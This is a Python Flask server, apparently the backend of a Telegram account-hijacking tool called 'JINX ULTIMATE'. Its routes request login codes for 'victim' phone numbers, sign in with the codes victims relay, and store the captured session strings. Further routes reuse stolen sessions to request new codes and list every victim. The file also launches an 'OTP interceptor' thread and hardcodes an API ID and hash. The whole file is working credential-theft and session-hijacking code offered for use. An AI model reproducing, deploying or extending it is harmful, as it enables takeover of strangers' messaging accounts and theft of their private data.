import os
import asyncio
import threading
from flask import Flask, request, jsonify
import logging
import time
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from database import init_db, save_victim_session, get_victim_session, get_all_victim_sessions, update_victim_otp

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Environment variables
API_ID = int(os.environ.get("API_ID", 24289127))
API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")
MASTER_SESSION = os.environ.get("MASTER_SESSION")

@app.route('/')
def home():
    return "🔥 JINX ULTIMATE - RAILWAY ACTIVE! 😈"

@app.route('/health')
def health():
    return {"status": "healthy", "service": "jinx"}

@app.route('/send_code', methods=['POST', 'GET'])
def send_code():
    """Send OTP code to victim's phone"""
    try:
        if request.method == 'POST':
            phone = request.form.get('phone')
        else:
            phone = request.args.get('phone')
            
        if not phone:
            return jsonify({'success': False, 'error': 'No phone provided'})
        
        logger.info(f"📱 Requesting OTP for: {phone}")
        
        async def send_otp():
            client = TelegramClient(StringSession(MASTER_SESSION), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                return {
                    'success': True, 
                    'phone_code_hash': result.phone_code_hash,
                    'timeout': result.timeout
                }
            except Exception as e:
                logger.error(f"Send OTP error: {e}")
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = asyncio.run(send_otp())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Send code route error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/save_session', methods=['POST', 'GET'])
def save_session():
    """Save victim session after OTP verification"""
    try:
        if request.method == 'POST':
            phone = request.form.get('phone')
            code = request.form.get('code')
            phone_code_hash = request.form.get('phone_code_hash')
        else:
            phone = request.args.get('phone')
            code = request.args.get('code')
            phone_code_hash = request.args.get('phone_code_hash')
            
        if not all([phone, code, phone_code_hash]):
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        logger.info(f"💾 Saving session for: {phone}")
        
        async def auth_and_save():
            client = TelegramClient(StringSession(MASTER_SESSION), API_ID, API_HASH)
            await client.connect()
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                victim_session = StringSession.save(client.session)
                save_victim_session(phone, victim_session)
                return {'success': True, 'message': 'Session saved successfully'}
            except Exception as e:
                logger.error(f"Auth error: {e}")
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = asyncio.run(auth_and_save())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Save session route error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/get_new_otp', methods=['POST', 'GET'])
def get_new_otp():
    """Get new OTP for existing victim"""
    try:
        if request.method == 'POST':
            phone = request.form.get('phone')
        else:
            phone = request.args.get('phone')
            
        if not phone:
            return jsonify({'success': False, 'error': 'No phone provided'})
        
        victim_session = get_victim_session(phone)
        if not victim_session:
            return jsonify({'success': False, 'error': 'Victim session not found'})
        
        logger.info(f"🔄 Requesting new OTP for: {phone}")
        
        async def request_new_otp():
            client = TelegramClient(StringSession(victim_session), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                return {
                    'success': True,
                    'phone_code_hash': result.phone_code_hash,
                    'timeout': result.timeout
                }
            except Exception as e:
                logger.error(f"New OTP error: {e}")
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = asyncio.run(request_new_otp())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Get new OTP route error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/victims')
def list_victims():
    """List all saved victims"""
    try:
        victims = get_all_victim_sessions()
        victim_list = [v[0] for v in victims]
        return jsonify({'success': True, 'victims': victim_list, 'count': len(victim_list)})
    except Exception as e:
        logger.error(f"List victims error: {e}")
        return jsonify({'success': False, 'error': str(e)})

def run_bot():
    """Run bot dengan error handling"""
    while True:
        try:
            from bot_handler import start_bot
            asyncio.run(start_bot())
        except Exception as e:
            logger.error(f"Bot crashed: {e}")
            time.sleep(10)

def run_interceptors():
    """Run interceptors dengan error handling"""
    while True:
        try:
            from otp_interceptor import start_otp_interceptors
            asyncio.run(start_otp_interceptors())
        except Exception as e:
            logger.error(f"Interceptor crashed: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Initialize database
    try:
        init_db()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ Database init failed: {e}")

    # Start services in background
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    interceptor_thread = threading.Thread(target=run_interceptors, daemon=True)
    
    bot_thread.start()
    interceptor_thread.start()
    
    logger.info("🤖 All services started!")
    
    # Run Flask app
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
